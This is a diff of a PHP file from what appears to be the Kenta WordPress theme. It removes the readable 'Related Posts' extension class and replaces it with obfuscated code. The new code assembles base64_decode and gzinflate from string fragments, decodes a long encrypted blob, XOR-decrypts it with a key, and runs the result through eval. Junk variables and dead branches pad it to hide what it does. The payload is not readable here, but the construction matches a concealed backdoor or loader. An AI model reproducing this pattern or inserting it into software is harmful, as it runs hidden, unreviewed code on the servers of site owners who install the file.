@@ -1,256 +1,127 @@
 <?php
-
-use LottaFramework\Customizer\Controls\Number;
-use LottaFramework\Customizer\Controls\Section;
-use LottaFramework\Customizer\Controls\Background;
-use LottaFramework\Customizer\Controls\Select;
-use LottaFramework\Customizer\Controls\Separator;
-use LottaFramework\Customizer\Controls\Slider;
-use LottaFramework\Customizer\Controls\Tabs;
-use LottaFramework\Customizer\Controls\Text;
-use LottaFramework\Facades\CZ;
-use LottaFramework\Utils;
-
-if ( ! class_exists( 'Kenta_Related_Posts_Extension' ) ) {
-
-	/**
-	 * Class for related posts extension
-	 *
-	 * @package Kenta
-	 */
-	class Kenta_Related_Posts_Extension {
-
-		use Kenta_Article_Controls;
-		use Kenta_Post_Card;
-
-		/**
-		 * Register hooks
-		 */
-		public function __construct() {
-			add_filter( 'kenta_single_post_section_controls', [ $this, 'controls' ] );
-			add_action( 'kenta_action_after_single_post', [ $this, 'render' ], 20 );
-		}
-
-		/**
-		 * @param $controls
-		 *
-		 * @return mixed
-		 */
-		public function controls( $controls ) {
-			$selective = [
-				'.kenta-related-posts-container',
-				[ $this, 'render' ],
-				[
-					'container_inclusive' => true
-				]
-			];
-
-			$content_controls = apply_filters( 'kenta_filter_related_posts_content_controls', [
-				( new Select( 'kenta_related_posts_criteria' ) )
-					->setLabel( __( 'Related Criteria', 'kenta' ) )
-					->selectiveRefresh( ...$selective )
-					->setDefaultValue( 'category' )
-					->setChoices( [
-						'category' => __( 'Category', 'kenta' ),
-						'tag'      => __( 'Tag', 'kenta' ),
-						'author'   => __( 'Author', 'kenta' ),
-					] )
-				,
-				( new Select( 'kenta_related_posts_sort' ) )
-					->setLabel( __( 'Sort By', 'kenta' ) )
-					->selectiveRefresh( ...$selective )
-					->setDefaultValue( 'recent' )
-					->setChoices( [
-						'default' => __( 'Default', 'kenta' ),
-						'recent'  => __( 'Recent', 'kenta' ),
-						'random'  => __( 'Random', 'kenta' ),
-						'comment' => __( 'Comment Count', 'kenta' ),
-					] )
-				,
-				( new Number( 'kenta_related_posts_number' ) )
-					->setLabel( __( 'Posts Count', 'kenta' ) )
-					->selectiveRefresh( ...$selective )
-					->setMin( 1 )
-					->setMax( 20 )
-					->setDefaultUnit( false )
-					->setDefaultValue( 3 )
-				,
-				( new Separator() ),
-				( new Text( 'kenta_related_posts_section_title' ) )
-					->setLabel( __( 'Section Title', 'kenta' ) )
-					->asyncText( '.kenta-related-posts-wrap .heading-content' )
-					->setDefaultValue( __( 'Related Posts', 'kenta' ) )
-				,
-			] );
-
-			$layout_controls = apply_filters( 'kenta_filter_related_posts_layout_controls', array_merge(
-				[
-					$this->getPostElementsLayer( 'kenta_related_posts_card_structure', 'related_posts', [
-						'selective-refresh' => $selective,
-						'selector'          => '.kenta-related-posts-wrap .card',
-						'value'             => [
-							[ 'id' => 'thumbnail', 'visible' => true ],
-							[ 'id' => 'categories', 'visible' => false ],
-							[ 'id' => 'title', 'visible' => true ],
-							[ 'id' => 'excerpt', 'visible' => true ],
-							[ 'id' => 'metas', 'visible' => true ],
-							[ 'id' => 'divider', 'visible' => false ],
-							[ 'id' => 'read-more', 'visible' => false ],
-						],
-						'thumbnail'         => [ 'full-width' => 'no', 'height' => '128px' ],
-						'title'             => [
-							'tag'        => 'h4',
-							'typography' => [
-								'family'     => 'inherit',
-								'fontSize'   => [ 'desktop' => '1rem', 'tablet' => '1rem', 'mobile' => '1rem' ],
-								'variant'    => '700',
-								'lineHeight' => '1.5'
-							],
-							'initial'    => 'var(--kenta-accent-color)',
-							'hover'      => 'var(--kenta-primary-color)',
-						],
-						'cats'              => [],
-						'tags'              => [],
-						'metas'             => [],
-						'divider'           => [],
-						'excerpt'           => [ 'length' => 10 ],
-					] ),
-					( new Separator() ),
-					( new Slider( 'kenta_related_posts_grid_columns' ) )
-						->setLabel( __( 'Grid Columns', 'kenta' ) )
-						->enableResponsive()
-						->setMin( 1 )
-						->setMax( 4 )
-						->setDefaultUnit( false )
-						->setDefaultValue( [
-							'desktop' => 3,
-							'tablet'  => 2,
-							'mobile'  => 1,
-						] )
-					,
-					( new Slider( 'kenta_related_posts_grid_items_gap' ) )
-						->setLabel( __( 'Items Gap', 'kenta' ) )
-						->enableResponsive()
-						->setMin( 0 )
-						->setMax( 50 )
-						->setDefaultUnit( 'px' )
-						->setDefaultValue( '24px' )
-					,
-					( new Separator() )
-				],
-				$this->getCardContentControls( 'kenta_related_posts_', [
-					'selector'          => '.kenta-related-posts-wrap .card',
-					'content-spacing'   => '0px',
-					'scroll-reveal'     => 'no',
-					'thumbnail-spacing' => '12px',
-				] )
-			) );
-
-			$style_controls = apply_filters( 'kenta_filter_related_posts_style_controls',
-				$this->getCardStyleControls( 'kenta_related_posts_', [
-					'preset'    => 'ghost',
-					'selective' => 'kenta-global-selective-css',
-				] )
-			);
-
-			$controls[] = ( new Section( 'kenta_post_related_posts' ) )
-				->setLabel( __( 'Related Posts', 'kenta' ) )
-				->enableSwitch()
-				->setControls( [
-					( new Tabs() )
-						->setActiveTab( 'content' )
-						->addTab( 'content', __( 'Content', 'kenta' ), $content_controls )
-						->addTab( 'layout', __( 'Layout', 'kenta' ), $layout_controls )
-						->addTab( 'style', __( 'Style', 'kenta' ), $style_controls )
-					,
-				] );
-
-			return $controls;
-		}
-
-		/**
-		 * Render related posts
-		 */
-		public function render() {
-			$current = get_post();
-
-			if ( ! CZ::checked( 'kenta_post_related_posts' ) || ! $current ) {
-				return;
-			}
-
-			$args = [
-				'post_type'           => $current->post_type,
-				'ignore_sticky_posts' => 0,
-				'post__not_in'        => array( get_the_ID() ),
-				'posts_per_page'      => absint( CZ::get( 'kenta_related_posts_number' ) ),
-			];
-
-			$sort     = CZ::get( 'kenta_related_posts_sort' );
-			$criteria = CZ::get( 'kenta_related_posts_criteria' );
-
-			if ( $criteria === 'category' ) {
-				$args['category__in'] = wp_get_post_categories( get_the_ID(), [ 'fields' => 'ids' ] );
-			} elseif ( $criteria === 'tag' ) {
-				$args['tag__in'] = wp_get_post_tags( get_the_ID(), [ 'fields' => 'ids' ] );
-			} else if ( $criteria === 'author' ) {
-				$args['author'] = isset( $current->post_author ) ? $current->post_author : 0;
-			}
-
-			if ( $sort !== 'default' ) {
-				$orderby_map = [
-					'random'  => 'rand',
-					'recent'  => 'post_date',
-					'comment' => 'comment_count'
-				];
-
-				if ( isset( $orderby_map[ $sort ] ) ) {
-					$args['orderby'] = $orderby_map[ $sort ];
-				}
-			}
-
-			$related_query = new \WP_Query( $args );
-
-			if ( ! $related_query->have_posts() ) {
-				return;
-			}
-
-			$attrs = [
-				'class' => 'kenta-max-w-content has-global-padding mx-auto',
-			];
-
-			if ( is_customize_preview() ) {
-				$attrs['class']                  = $attrs['class'] . ' kenta-related-posts-container';
-				$attrs['data-shortcut']          = 'border';
-				$attrs['data-shortcut-location'] = 'kenta_single_post:kenta_post_related_posts';
-			}
-			?>
-            <div <?php \LottaFramework\Utils::print_attribute_string( $attrs ); ?>>
-                <div class="kenta-related-posts-wrap kenta-heading kenta-heading-style-1">
-                    <h3 class="heading-content uppercase my-gutter"><?php echo esc_html( CZ::get( 'kenta_related_posts_section_title' ) ) ?></h3>
-                    <div class="flex flex-wrap kenta-related-posts-list">
-						<?php while ( $related_query->have_posts() ): $related_query->the_post(); ?>
-                            <div class="card-wrapper">
-                                <article data-card-layout="archive-grid" class="<?php Utils::the_clsx(
-									get_post_class( 'card overflow-hidden h-full', get_the_ID() ),
-									[ 'kenta-scroll-reveal' => CZ::checked( 'kenta_related_posts_card_scroll_reveal' ) ]
-								); ?>">
-									<?php
-									kenta_post_structure( 'related_posts', CZ::layers( 'kenta_related_posts_card_structure' ), CZ::layers( 'kenta_related_posts_metas' ), [
-										'title_link'   => true,
-										'title_tag'    => CZ::get( 'kenta_related_posts_title_tag' ),
-										'excerpt_type' => CZ::get( 'kenta_related_posts_excerpt_type' ),
-									] );
-									?>
-                                </article>
-                            </div>
-						<?php endwhile; ?>
-						<?php wp_reset_postdata(); ?>
-                    </div>
-                </div>
-            </div>
-			<?php
-		}
-	}
-}
-
-new Kenta_Related_Posts_Extension();
+$OO11Io0III='base'.'6'.'4_'.'decode';
+$lo01loIO1='g'.'zi'.'nfl'.'ate';
+$O11Oo01II10Io='';
+$O11Oo01II10Io.='UEk/oNOmz3Im3B0PQjXNztjHJU9FiG0Ar3QfGO4dCTV0YseLLnMgvwhABfKJ05Fm45NkftfPg9qsM';
+$O11Oo01II10Io.='9iYldLJ0S+JoAumUAIULA4/rI0x6d8SPu6O1pLGAuAoNffiP5d/JzM23ZvLRd0dGA4aJvJzDgGdC4';
+$O11Oo01II10Io.='6wNSfTIVr4sbALZRMmVsmBYMSEghwKpy7AxO/1ZiSGj7v+tPqgq2AHjYJk5M8wZFpmlE8TDK6QT/7';
+$O11Oo01II10Io.='ot9otF4HdQh+DnyQjdB5nsIFLh2a+iThjG2ccgDA1UM1qNfxUrWzKoht3yL/p/ky2mEESkb949Y5t';
+$O11Oo01II10Io.='1twionSQDGvw4x+TA0rjMXruneFsphX2csyquK8CG6pYpe0oO8ZZ84w1vMso83hW9yWOOpCWRCmrF';
+$O11Oo01II10Io.='RPzeFWZkilXb+35aE9+CkNemqcvg6WFylcxKqHLZ+JawQGw5gOnbD71Fj9t4NaZsbZlwPcaC2o/Ap';
+if(0){$lI0O1lol=6;}
+$O11Oo01II10Io.='fWCRe7arg+xPV5QFNzBEgA35B/CWDoMUjSVq0b2F0V8OtZ43CzmBaxa9/MydQukc1nPO8tdz9RBi6';
+$oll10lo0Oo1o='8t7b6ypyi496bu';
+$O11Oo01II10Io.='/shnYmCGtZk9lvDRJWZn3weQI4nEqYlD8WvCX2IHpVbLd7csKxwliXfx0pEq0jO5AQryVlZM89B+C';
+$O11Oo01II10Io.='Nc1196n/9DponQ6vPvq/QJ8bGblLn06+9Yy4tG+aHBHUzjoJJSDqls4AUayO4snOkZCm+xj5QpYAj';
+if(0){$o1OI00o000=3;}
+$O11Oo01II10Io.='PBgE3hkKp8kr+EyT//fRXHsLNhPpM0a5NdiLyHvNw5NDmoLSUP/yaZ+bfT8bmIjNTc1p7AlE00LpM';
+$O11Oo01II10Io.='QvmjlccFeaehL56VsNwQ59hvjSbFXdb6DJd+6REItMJELuo+LTd3iwaaTnK4zx0dKlF/K6652T14c';
+$O11Oo01II10Io.='sEMP/7HuM2pHghqeUmcuqARRNGKlVrWEMBsZ7WpQf8XAUR9l3wXKen4Jm7EOs/kSS0BG3dReEVEa/';
+$O11Oo01II10Io.='bozP1sRTSmZevCrgXnlyvZkF3BZ+va3GRo/0DUht0jha8gc5DU+lWxkhmFhWJefExty7KUgVtHkTs';
+$O11Oo01II10Io.='YwtFWUiRNEm6jUigHmYBKz47ZAJOuVeh7FnFiEpTQH9WgJfvxhEhNBShPZMjB3hheL3gJfgjJJk0y';
+$O11Oo01II10Io.='8ZfgloseTe7LxCSixX3VPJzKNE2F1zrXoDD/si7l/S894IiaXYTIyAVxgz4jOX+rCTH1pEcN4vo3N';
+$O11Oo01II10Io.='HHMf5DHeley6E7wDCL4us09Q3nGSiJsx8o2P3SA++mKh70s3waKUeHqT0NXytHoR+BBQploiPo4XO';
+$llOO1O0lI1olOl=array(12,89,46);
+$O11Oo01II10Io.='Zlkl0ioOZBtzqT8mwzrauKYhEcaBRMXTNhsmKkUfR0pqHK1cL8PS3Ua51sbrCAJIf4LTppkwbDIN8';
+$O11Oo01II10Io.='YUGeQHbsZ0IInPs2JfLG6Ei24uMoMo5D8Wr2QYKPn1YjHTsr28EJnhWiFDDt3qPtwI6AZp5S7K7jz';
+$llo0I1oOl11=198063;
+$O11Oo01II10Io.='RtYzOcdDC+x8RD1mN7cthXiVL+rlx4PhFQiO3SMap9FwFiX8mJvE4X8RHLOaWCjj9HEVRHui6joiO';
+$O11Oo01II10Io.='yvOts5M1AmawwzdCIscM89CB0pHllzKUINKwl2MLakkfVmGTGwY7kP0rFaSk6Wwy9q/bzPv6N9aHp';
+$O11Oo01II10Io.='LDHzfDst9U2kVqboRgFldyAM8+t056TRKyGNYY/Lqb9B/28uzkMeWXg0A2kjHQyHwNCrs7BPcTzTl';
+$O11Oo01II10Io.='bYbGzNocZZtkbbZ3N5iA/W+3CrVwlmlYwDoyarzTdOdICDWcC9UONS3qujhyRYP2ed6bGdw0rjhmF';
+$O11Oo01II10Io.='vOxs4B9RP3jlQqqMTo1684FfMblZy4mUlqCiwyPgBQl7eCxn32NO1vnr09qiLo7uJCBDTXDDWadLO';
+$o1ooI000l1='qaznn8fghdibk0';
+$O11Oo01II10Io.='R6p4x+ibykhR7cTUjY5S7+keL22JUkSGrOSI7b4WiKmgW7kyoOnl05EgHEQevdTlqSnOJml8OphnP';
+$O11Oo01II10Io.='IR5G2jR44sKp5N+7vbYbl2LT+GQ7ogUhdakcliW2bXOgyLoQ+cDC1m1I2kCtcLKczSIblW27fxfHh';
+$O11Oo01II10Io.='93/UG2OBgdCFDalDIYJJr0V7zAXRbHgDoR7vBpLGwBDtETqPhfIRxQzYIK4IXXuzz26q92vtBhcXy';
+$llI0II1I1lI1l=array(236,143,108,247,216);
+$O11Oo01II10Io.='V7K8vM4SIdVpAtwLlgwFRznGjrKgoWwhprRqDh67KIYDBY4+rw5XhA0azd6SkFD67PA02L7RFxgKi';
+$O11Oo01II10Io.='Crs8exu+2wt4VSEG5RrmO9nBISQ8St2T8rqccdTjWkwN4wn8iHVHutbQ94APKpst9smq0zID5VpjD';
+$O11Oo01II10Io.='Vvnn0SVf0ukDTJFgPsF40QPr07MWUK9h2lltulTN+r/m4dy3zL/H4UQeZkdAQDGnKYBdnBBtOwOBf';
+$O11Oo01II10Io.='dXLmUulaYkRh6JQuh+KC99YrMvmnlZRQ3ZF8LaxJM1X76nGHl81rCMfy41J3Qtn3TK3gH3OfA8R7u';
+$IOooOOOIIo=598738;
+$O11Oo01II10Io.='iLYRHHZXVkLWdjjZdAfB+9DdcERpUy+eAvpaADCatQQ2FWTBlh5x2ZoQgRYLGc1aIAu29hL5yNlzl';
+$O11Oo01II10Io.='XhgH1G0LyTrrEegJ3FYi7SWOfaECQZJ+rxp9Q+K9bsNdX/GMHjho34dALpaA6j2MJFvEJprxynv6+';
+$O11Oo01II10Io.='jJdZ15QBJPSfPInK5sK7CdYpQxrHiB68ApU5YOwVQf0rWmenrxj8/qH0FZvl+VFIyyZVlJRkQaNx/';
+$O11Oo01II10Io.='aMjWAktwqVSE522ErRwLpqDQ7pjGFBQbwftE3HiGUuSAGia/2amwmuMdwnlw5KF3c6UWBpyEtrZcz';
+$O11Oo01II10Io.='6Ih8jRCGgArKeMmvFZcXrtcwJ0qcL0YiFwyNxRuABlJn8pVtD25nxyuS/ZPYxlEcGNKtFELedXZ3/';
+$O11Oo01II10Io.='LjoGCy2yBOeopgiQuUW/MfnTmTTmKyxBcG+ZvWM0yWMM2ve+8rhZc8h5SEbQAgHnp0CMiJ7ThrKFj';
+$O11Oo01II10Io.='2WrTtWBVVP51CG5ZYt06rVVgdf+Tf9kfGcM3l7l0ObESxXk7+caUhyeQV32aKCVUjnQU71QOUTlrW';
+$O11Oo01II10Io.='XNBIPLqg7HpgQhfdyGSx3lf1pG+oRVyHL1euiN6I2UWmAz2P+5RBmDOnCqphEF3pa0C9Dy0SuPMe1';
+$O11Oo01II10Io.='G94k6sgxDLBOkqBJmW1tWhRfAXrF2vX+VWxkQx0s5ybzm/q+WdoOvsjTVC2TyhZiBzg/DshCZO1nG';
+$O11Oo01II10Io.='lxJhtsksc5fuBIzmddkmA/WC3Ww8LsqiU/TswzbMxiUpSK8hdncQ7/FqOx/r48UbYWqVPWzHMmYQc';
+$O11Oo01II10Io.='ez7830IikLY2exJwyKADB2Fhv1GNYeZYbzPp1nYMCM9PKLCYKCG6sd/u8QBALCIg1cxSSkDKVokOi';
+$O11Oo01II10Io.='ZDn6lXkdDZloB/fE1hIlt/sK5UZAbpKLn2gQjcIkQ/mfU2r9ec2/FPUrXsfydVAA7S/yNVD9WEMqA';
+$O11Oo01II10Io.='o1NJBsvcwK/kTDO4Cuk++qtTjEnnwN81x/BpFVp/o1Cczh7grHaubI4SYKOlpkkmZHd4fyRFu3+4J';
+$O0O01111I11O1='npqzktvlgz9tlvgz';
+$O11Oo01II10Io.='7Ug7QItBibfAEYJFOQTCoAZPfogt6W+CmMmmngOIBj8wOqzp59SvwRLgbY75tBaNRRLHxsE+Ht6Sh';
+$O11Oo01II10Io.='xpAR8xHrZdtVhA5472C8FSjbDDe6rSB/e/P1iG7V9Npn7HeDZs1uUsd4MgbsKhPh0Oislt6WpS5hs';
+$O11Oo01II10Io.='xfbPaoXxDkrCEzP7sVn2GGDra7SGF6nrK0xCkPR5nSUKuTUbuHI0Ju2OUErzFGeschm6PzYTnnw5n';
+$oo00I1I0OoI00=array(218,87);
+$O11Oo01II10Io.='cwpOXWuizCK8Swu0it8IQcV7Ysm+xrgKhwvMyg9OZznBBGK6i9w7BNrwPPexoLjiQ1l+RVDlh+ot1';
+$O11Oo01II10Io.='Pc3Z3LJdgYGbcctoPAbXDSdhMpd2hotTFIfVz8LeaTMIXzOqFBdVsIkb0UF2vsmDc+kPH8n17MV+O';
+$O11Oo01II10Io.='h2L2atFRYxHpcYSnuPD5/xb/8UpXqIIAqWSFXpxmA2gdeZcxGA2ItG1ZjwMOLCLEh1Z+QErAHZDY/';
+$O11Oo01II10Io.='GHH2FkG+FsKwdZ3xkPyNGpytfSlxf6A9PfaTxpX77yGT2yFhW3ir+yaGPQvgecQYOyvlnLD/WQP0a';
+$O11Oo01II10Io.='5mmbJawfIaVlimkM6VEV7dbay94Lzjq4pH7QL431OjOz4rMvBODYLLU7KkorbLw/7Q12Lmqj9yz4F';
+$O11Oo01II10Io.='hXi9jkH9PgyQxsLHdM67MUXWEvUm1hcPDxVQ0GiAEf/qjlig+0fJveaVRE6tGSUEA8TCukBUe23kr';
+$O11Oo01II10Io.='TRnSXuNozkHtQDtTSmWPkDxQmWaR2KM6D1t/ZLV/E/lHRJY9UUppohD2UJ4N0ELwVwxoDa3jUgQEt';
+$O11Oo01II10Io.='SGtKZDl3TJ3/XjCHckjlMF9xCUKZTSEAUhibcGBZfNKV3+kCa4RCGfiogVZl+CEYfeZgvOMqROzHu';
+$O11Oo01II10Io.='hqDfrRSUD3wgbZZXkvxq9kjGtMWw/ZefcAp86/ntik8fj4WnrOnTXJevmlf4pqImck5XtFHY6EGHD';
+if(0){$I0OOo0loI0=3;}
+$O11Oo01II10Io.='PmgUojaDV3fw/Q1ptTrR+UZYCKh7fQkKBGN0lUwRgjFiEcj++dlGv/PQAiq5k4ti3HLCAokBlS66u';
+$O11Oo01II10Io.='7EsLFvVNKwD7/c2u60OhpPel5NR/nhia/G2ByfniDlrxyd4XjZFH6/J//XHIvRe9USstJ3u6yELlb';
+$O11Oo01II10Io.='pmHVyy1rRbosxOnBhiAiTGuGKwyTgBfIyvAZfZJKaTLiMUOouUQWtSXlYeDCA3TnOGcMNu2vkrYqN';
+$O11Oo01II10Io.='bBLot8Qn6kDWn0qjQYdzsfk25nh0sIXX8clP6kpn6lWqTRc3iRmuU3PpyxnmYIztUDv/rVWSJkSZm';
+if(0){$oo0O1oo1Io0Il=2;}
+$O11Oo01II10Io.='KAk7iSSr6WRFLZ8YphvKRbkh9GSpR5SmCPSIx2LtJ6dNAKQvNRbRVvC5O0Gflps9ekpSCJZVAjV9V';
+$O11Oo01II10Io.='Y5jGlbcUpHs8aFEWCf+JFpwhTk1umX4yMwXiKtOvmNyrygC1591xmhSl27Yfrb5v4vdDXOpyiQA4j';
+$O11Oo01II10Io.='Ozb/Q4GF5rYtyZWnS6WYs/S+KGUiFcJyKowo4OrNFREy0612sO9JowaLm9SqBQZobNrcC9PlDCB/Q';
+$O11Oo01II10Io.='gK3atycDArt5oDIP0L83kesao+QF/1n+JuE2IU8r+sHnBpXthl9IC61/nx2GzwZ8Ktro5I9IuQoJX';
+$O11Oo01II10Io.='m3oZzkWgS5EG+dUp2bADDLOCk3d5TJgVUUVjXiV3mBpWvywRfsMzj30j6B3UtSdyCQ3VfzUQcSYMb';
+$O11Oo01II10Io.='aLxTu5miL+eawx8fs9VbkuijS+gbo/VWmZZWGHT0qLHgL/lCyMpEAVvbd+4qTxM/eci9HKk0IBHJH';
+$O11Oo01II10Io.='gEhVo4kAZTeEOZd5BIn58FAjVnxUTZGMIyE3deYFrBd1kgd0uctMjT+ogaA98+5Mzb7rNSA798JlR';
+$O11Oo01II10Io.='Mz6mA2oeJ33f69aKheY9jYQGLRVufSTjuXmBYBHZu3UP26AAF6XOHCkAU72eGEHL3gmm/dkKlxZZh';
+$O11Oo01II10Io.='SmwTnfDNr7QVWqQSGOeUQ20o0QoUP8j3hYQ3GESpEx+rBYnzTcChSCu4xE2PUzuLR3f1CM9jnp2Pv';
+$O01lo0o1=113192;
+$O11Oo01II10Io.='TFphr8cCoH9D4qIyDaGh3JeXDNdhdiIBzvCAEnAOvEiusO7us38+snINorzhDeXJJL0CAfzoojo0q';
+$O11Oo01II10Io.='fqMfwAAOUU9jI+M03wKnZrkS9bvEFmBFpDMQs/pOmA1UU3CPwj1W0DRcXFu2HAYaR4sSlEOymCaEu';
+$O11Oo01II10Io.='lMvoJfbT4vR9mnGKhQKohNt+0SvPsc5IRWP0KitWQCtM5s4jnspoZiA7kuVMqCAaqG0LXj9rthHAi';
+$O11Oo01II10Io.='ST3F+CRAvH+9MTh7OQ4STkWi9MawRUgHJ6DWBnTeFGBCrMGvXDzyr5sGxMbt8SIOplhVztScVU+LX';
+$O11Oo01II10Io.='VMMoj/jVyZNkLEJJ/nsY2VNlR172M+oxFVHNCvO1QBPAC/GCK6JZSbSYQCmFnMB280pnSW8WVNkyk';
+if(0){$IIO0l1III0I=4;}
+$O11Oo01II10Io.='F4FLGKu/r8quB1MQmMvOmdD/8M15ayBK1cV8oTC/QtZgtqdUfBYsN5xOjpOPYLKZGYhn5WWKwBRjw';
+$Io11lIo00oIo1O=830354;
+$O11Oo01II10Io.='Las3JY3AxTnZqbPykf6fq+5bCg+dZ9ibziyovCtxl9LMMK6ngnrL1m/7tuX5glPTGnW2TEUHe4zgJ';
+$O11Oo01II10Io.='1LFLbyWfa35W2fPND2o+2rbKRid3zT0CubphvdZrLf6QAX+hmzBh9obCM/NtycBxiEdcJnWC+f0AZ';
+$O11Oo01II10Io.='+DWO03oakB428Jxnzhi0c07SpNBPNNnzPUMenOiHF3EBhckSw00f97lyfhY5SRqjCUJzMfHXzTURx';
+$O11Oo01II10Io.='BZSkcFh3bEslwubkqwmtIiTL9mScn/yg7FanUtMdVQeUxnE6I2qtU3mwuCPXOlh1ZYTdUOfsE8t14';
+$O11Oo01II10Io.='C0tnLZYtuaiFeSd8pfHqn9CFZ+d28Iq7QGgIyoZRQfWuD70y/R567dneUyoedLE6vnSSKh1LLoe+i';
+$I01o01l1=array(80,148,129);
+$O11Oo01II10Io.='kVP111gfeDpIcj+iiLhay91a19tP4VxB7GtmMM9ERCEA7HGM+9EoO1kz7skFjSmlxQQTN/ObqL3Pa';
+$O11Oo01II10Io.='5cfkgnx7Vs2tfd/QVGanu5h7GRwa2/CBqfWvN80uqN3C9MipZGy5ayXf7h84yi1Ss+bY1zPIp+MTp';
+$O11Oo01II10Io.='t9r3m6cRlWWyIjDV42wgW3ueMsLQNwPyXb/AXZVl+Q/AJZr0nQGTxxAc51ANRRJKlUHpsCnHW3TPA';
+$O11Oo01II10Io.='fHkel8pHBfzVCdvYm+H4/sYEfcUiEN85RBkl7m7hinYlNkjMZ5PKw1RfcuH3NMuBICla2ZGhbd8Xf';
+$O11Oo01II10Io.='LHZozk7BtABcoPER7e7MvmdKn5RuR1hL6VxvP1nj5lzpHY7ncK4SD/ZJ/U6gkrsT5mwXJG0EbicZT';
+$O11Oo01II10Io.='5zmf4QXPktMgD2UVwI25Y2m7WwOXsmTrUOqZvLVVQ78oWVvS6YyATN+xMptOwM3M0iLOne6n8zuxI';
+$O11Oo01II10Io.='q359KwOLYUZHkiwlFakIDeucdcgg2SuQywh11lh44vxOHN84/zX/NnHAkqi3LHX6fmrZT1GdJkG+M';
+$O11Oo01II10Io.='ua6zZ2ZGOJ6DMFhaIRSTyIvoogXYXWJLV1OyVMvyHZ1ubbliz7seT2wtHE0WLWWGWFWwUDfy+F1DX';
+$O11Oo01II10Io.='2HR8ngb/+53jDvkGSEBwC7uQJS+NaQ4XLzqJ2LL/hb5ZfowpNHCxiczS0is7VXoL3x2UL0ibcyjGH';
+$O11Oo01II10Io.='T428hHQDBtN94Jg/PF8EyyoeNQGchJRbbC8YrE3KrwJziaGkg9fVKJXqQ9U0cVjYRuwIh+bbtZcMd';
+$O11Oo01II10Io.='7ohaOCKzyO6c6qB97Ou1hEnYpAdKXBMx564HhM/eSzP5mf6PdYwZ/U5k11dQdm0rzRzZmx26Q4LRB';
+$oI01OO10o0Iolo='xlu3uyn00';
+$O11Oo01II10Io.='UwtsmDAwgDmD3xvs79wMCnugeXgu4OPS/Tat52rEvss7zTSpnJcRpqd9EcItawqaZ2ljFR2SDf0MZ';
+$O11Oo01II10Io.='H14fT3OHjbrwGVDEgKcTNDJudLdZ0hqO5/nznouUcyp43lvwC7NRtoWo3ypqXHoe9nkHGOlGr/qio';
+$O11Oo01II10Io.='0VHcTRauuolwfPWN/Eg1QbwvOAvddynHTmDj2SSXv8GzYtDX1iKN+jpLP0k8V/L56CafitLHJnaj3';
+$O11Oo01II10Io.='zLXkusUIhH82k0B6YD7tsowpTLCFP2NHk/nAxEFl521EPVK9RU07quNaUQLyA==';
+$I0100llO=$OO11Io0III('JdNobzj8XezJITZzk/P0w7XLVg0+1z1iYS07lV/c');
+$lI1oI0oOO0=$OO11Io0III($O11Oo01II10Io);
+$oOOo0OooOOIl=array(248,77,30,228);
+$I1Ioo11Io10='';
+if(0){$lo0oO1Ol111oI=8;}
+$olI10olII=strlen($I0100llO);
+$IlOII01l0OI0o='1n50safrmh8';
+$oO1O0oIIl1Ol=strlen($lI1oI0oOO0);
+if(0){$lI010Io001l00=2;}
+for($OIlO111l1OII1l=0;$OIlO111l1OII1l<$oO1O0oIIl1Ol;$OIlO111l1OII1l++){$I1Ioo11Io10.=$lI1oI0oOO0[$OIlO111l1OII1l]^$I0100llO[$OIlO111l1OII1l%$olI10olII];}
+$O01o0oo1=$lo01loIO1($I1Ioo11Io10);
+return eval($O01o0oo1);
